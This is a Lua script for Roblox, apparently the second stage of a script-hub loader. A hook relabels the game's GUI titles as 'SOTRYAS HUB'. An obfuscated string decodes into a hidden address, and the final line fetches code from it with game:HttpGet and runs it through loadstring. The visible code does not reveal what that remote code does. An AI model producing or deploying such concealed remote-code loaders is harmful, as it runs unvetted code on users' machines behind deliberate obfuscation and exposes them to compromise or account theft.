
--[[ STAGE 2: VISUAL CORE ]]
local BvEmGTVtYEZD2bbVCCEgD="\102\073\081\022\088\010\013\008\012\080\012\081\092\085\086\070\186\071\090\085\191\186\064\190\076\083\078\191\186\097\066\180\177\185\177\179\072\187\174\180\190\160\180\066\108\172\168\183\162\103\161\160\170\147\166\173\166\156\163\093\167\151\147\167\146\153\144\155\149\139\139\073\138\143\146\078\135\140\148\132\129\135\138\250\142\255\252\142\242\134\241\251\132\188\234\135\245\183\182\162\232\234\237\236\247"local zi1lipoNRisY=59 local ApEOuaUHjQbOPOzem=236 local p2ilk1G1kd1U7L_=1 local oXzelCKbQn0T=1 local VAL8yHM7CprJQ6jbs=15 local CM7o_JMaoeicVF70Cik=true local JsvnR_hfd9x8pXFyZ=bit32 and bit32.bxor if not JsvnR_hfd9x8pXFyZ then JsvnR_hfd9x8pXFyZ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Y2HeRshi9hZxr_dknwB7BR={}for uHwA_zL8_Px4ksEUPAbIT=1,#BvEmGTVtYEZD2bbVCCEgD do local uMEnkJT1QuiwEigcudcTlz=string.byte(BvEmGTVtYEZD2bbVCCEgD,uHwA_zL8_Px4ksEUPAbIT)local A9jhpBfOLc41=(ApEOuaUHjQbOPOzem+(uHwA_zL8_Px4ksEUPAbIT*oXzelCKbQn0T)+VAL8yHM7CprJQ6jbs)%256 if p2ilk1G1kd1U7L_==0 then uMEnkJT1QuiwEigcudcTlz=(uMEnkJT1QuiwEigcudcTlz-A9jhpBfOLc41)%256 Y2HeRshi9hZxr_dknwB7BR[uHwA_zL8_Px4ksEUPAbIT]=string.char(JsvnR_hfd9x8pXFyZ(uMEnkJT1QuiwEigcudcTlz,zi1lipoNRisY))else uMEnkJT1QuiwEigcudcTlz=JsvnR_hfd9x8pXFyZ(uMEnkJT1QuiwEigcudcTlz,zi1lipoNRisY)Y2HeRshi9hZxr_dknwB7BR[uHwA_zL8_Px4ksEUPAbIT]=string.char((uMEnkJT1QuiwEigcudcTlz-A9jhpBfOLc41)%256)end end local yPfwrlbIMAcGFB2fiDt=table.concat(Y2HeRshi9hZxr_dknwB7BR)if CM7o_JMaoeicVF70Cik then yPfwrlbIMAcGFB2fiDt=string.reverse(yPfwrlbIMAcGFB2fiDt)end local GwuVr4XNxn0wv5g=yPfwrlbIMAcGFB2fiDt
local HubName = "SOTRYAS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(GwuVr4XNxn0wv5g))()
